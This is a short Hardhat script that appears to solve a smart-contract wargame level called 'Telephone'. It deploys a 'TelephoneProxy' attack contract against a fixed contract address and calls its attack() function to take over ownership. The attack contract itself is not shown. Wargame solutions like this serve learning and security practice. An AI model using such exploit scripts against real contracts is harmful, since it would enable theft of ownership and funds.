// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

async function main() {
  // get telephone contract
  const telephone = await ethers.getContractAt("Telephone", "0xc8aCD399f7FEbEC1f2c5704482DF789EEC4F3E1F");

  // deploy attack contract
  const TelephoneProxy = await ethers.getContractFactory("TelephoneProxy");
  const telephoneProxy = await TelephoneProxy.deploy(telephone.address);
  console.log(`Telephone Proxy Deployed`)

  // change owner
  const attackTx = await telephoneProxy.attack()
  attackTx.wait(4)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
